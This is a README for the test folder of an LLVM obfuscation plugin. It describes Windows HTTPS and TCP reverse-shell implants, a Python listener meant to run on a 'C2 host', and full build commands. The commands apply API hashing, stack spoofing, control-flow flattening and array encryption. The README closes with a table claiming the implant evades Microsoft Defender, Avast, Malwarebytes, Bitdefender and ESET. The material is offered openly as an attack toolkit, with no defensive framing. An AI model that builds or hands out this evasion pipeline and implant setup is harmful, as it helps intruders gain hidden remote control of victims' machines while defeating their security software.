# obfuscator/test

This directory contains example source files and compilation scripts that demonstrate the full obfuscation pipeline, and that have been verified to bypass several commercial security products.

---

## Directory structure

```
obfuscator/test/
├── compile_example.sh          # Helper script — compiles httpsRS.c end-to-end
└── WindowsTools/
    ├── APIResolver.c           # Runtime API resolver (linked with every Windows build)
    ├── Callback.asm            # MASM stub for thread-pool / tail-call dispatch
    ├── Callback.h              # Declarations for Callback.asm
    ├── PatternSearch.cpp       # PE export-table pattern scanner
    ├── PatternSearch.h
    ├── ProxyCallbacks.cpp      # Stack-spoof proxy callback wrappers
    ├── ProxyCallbacks.h
    ├── basicRS.c               # Basic (non-TLS) reverse shell variant
    ├── decoder.c               # Array decode helper (compiled into payloads)
    ├── httpsRS.c               # Windows-specific HTTPS reverse shell variant
    └── listener_httpsRS.py     # Listener matching WindowsTools/httpsRS.c
```

---

## Files


### `httpsRS.c`

An HTTPS reverse shell written in C. Targets Windows via MinGW cross-compilation. Uses `WinINet` to establish an encrypted channel back to the listener. Pairs with `listener_httpsRS.py`.

### `listener_httpsRS.py`

Python 3 HTTPS listener. Accepts incoming connections from the compiled `httpsRS` binary, presenting a self-signed TLS certificate. Run on your C2 machine before launching the implant.

### `compile_example.sh`

Automates the four-stage compilation pipeline (emit IR → link IR → run passes → compile to binary) for `httpsRS.c`.

**Prerequisites:**

- **`clang-cl`** — the MSVC-compatible Clang driver, required to produce a genuine Windows PE without a MinGW runtime dependency.
- **xwin splat cache** — Windows SDK headers and import libraries fetched by [xwin](https://github.com/Jake-Shadle/xwin). The script expects the cache at:
  ```
  xwin-0.9.0-x86_64-unknown-linux-musl/.xwin-cache/splat
  ```
  Edit the `XWIN_SPLAT` (or equivalent) variable at the top of the script if you used a different xwin version or install location.

Edit the `LLVM_BUILD` variable to point at your LLVM build directory, then run the script. See the [Usage](#usage) section below.

### `WindowsTools/APIResolver.c`

The runtime component of the **API Hashing** pass. When the pass replaces a direct API call with a CRC32 hash, this resolver is responsible for walking loaded DLL export tables at runtime to find the real function pointer. Must be compiled to IR and linked before the pass runs.

### `WindowsTools/Callback.asm` / `Callback.h`

MASM assembly stub used by the **thread-pool evasion mode** of the API Hashing pass (`-os_version=windows -api_type=threadpool`). Implements the tail-call trampoline and synthetic stack frame that makes thread-pool callbacks appear to originate from a legitimate OS frame.

### `WindowsTools/ProxyCallbacks.cpp` / `ProxyCallbacks.h`

C++ wrappers that set up the stack-spoof chain before submitting work to the Windows thread pool. Used together with `Callback.asm`.

### `WindowsTools/PatternSearch.cpp` / `PatternSearch.h`

Utility that scans PE export tables by pattern rather than by name — used internally by the resolver when the hashed name is not directly exported.

### `WindowsTools/basicRS.c`

A simpler reverse shell that uses a plain TCP socket rather than HTTPS. Useful for testing the obfuscation pipeline without needing TLS.

### `WindowsTools/decoder.c`

Standalone array-decode helper that can be linked into a payload when the **Array Obfuscation** pass (`arrenc`) is used and a separate decode stub is preferred over inline decode/encode sequences.

---

## Usage

### Quick start with the helper script

Requires `clang-cl` and the xwin splat cache at `xwin-0.9.0-x86_64-unknown-linux-musl/.xwin-cache/splat` — see [`compile_example.sh`](#compile_examplesh) above for details.

```bash
# Edit LLVM_BUILD (and XWIN_SPLAT if needed) inside compile_example.sh first, then:
cd obfuscator/test
chmod +x compile_example.sh
./compile_example.sh
```

The script emits IR, links the API resolver, runs all obfuscation passes, and produces a final `program.exe`.

---

### Manual pipeline — Windows target

Replace `/path/to/llvm-project/build` with your actual LLVM build path.

**Step 1 — Emit IR**

```bash
LLVM_BIN=/path/to/llvm-project/build/bin

$LLVM_BIN/clang \
  -O0 -Xclang -disable-O0-optnone \
  -Wimplicit-function-declaration \
  -emit-llvm -S httpsRS.c -o httpsRS.ll \
  -I/usr/x86_64-w64-mingw32/include \
  --target=x86_64-w64-windows-gnu

$LLVM_BIN/clang \
  -O0 -Xclang -disable-O0-optnone \
  -emit-llvm -S APIResolver.c -o APIResolver.ll \
  -I/usr/x86_64-w64-mingw32/include \
  --target=x86_64-w64-windows-gnu

$LLVM_BIN/clang \
  -O0 -Xclang -disable-O0-optnone \
  -emit-llvm -S decoder.c -o decoder.ll \
  -I/usr/x86_64-w64-mingw32/include \
  --target=x86_64-w64-windows-gnu
```

**Step 2 — Link IR**

```bash
$LLVM_BIN/llvm-link \
  APIResolver.ll httpsRS.ll decoder.ll -S -o hack.ll
```

**Step 3 — Run obfuscation passes**

```bash
$LLVM_BIN/opt \
  -load-pass-plugin "../../build/ObfuscationPlugin.so" \
  -passes="api_hashing,function(constobf),function(swapops),function(sub),function(splitbb),function(fla),arrenc,verify" \
  -swap_prob=67 \
  -arrenc_seed=0xAABBCCDD \
  -os_version=windows \
  -api_type=hashing \
  -api_entry=main \
  -sub_loop=2 \
  -split_num=2 \
  -S "hack.ll" -o "out.ll"
```

**Step 4 — Compile to binary**

```bash
$LLVM_BIN/clang out.ll --target=x86_64-w64-windows-gnu -o program.exe
```

---

### Manual pipeline — Linux target

Omit the MinGW include path and the `--target` flag throughout. The `api_hashing` pass requires Windows and should be removed from the `-passes=` string when building for Linux.

```bash
OPT=/path/to/llvm-project/build/bin

$OPT/clang \
  -O0 -Xclang -disable-O0-optnone \
  -emit-llvm -S test.c -o test.ll

$OPT/opt \
  -load-pass-plugin "../../build/ObfuscationPlugin.so" \
  -passes="function(constobf),function(swapops),function(sub),function(splitbb),function(fla),arrenc,verify" \
  -swap_prob=67 \
  -arrenc_seed=0xAABBCCDD \
  -arrenc_entry=main \
  -sub_loop=2 \
  -split_num=2 \
  -S test.ll -o out.ll

$OPT/clang out.ll -o out
```

---

### Running the listener

Start the Python listener on your C2 host before launching the compiled implant:

```bash
python3 listener_httpsRS.py
```

The listener binds on port 443 by default with a self-signed certificate. Edit the port and certificate paths at the top of the script as needed.

---

## Verified bypass results

The compiled `httpsRS` *(HTTPS interface slightly unstable)* payload (with the full pass pipeline applied) has been tested against:

| Product | Result |
|---|---|
| Microsoft Defender | Bypassed |
| Avast | Bypassed |
| Malwarebytes | Bypassed |
| Bitdefender Free | Bypassed |
| ESET NOD32 | Bypassed |

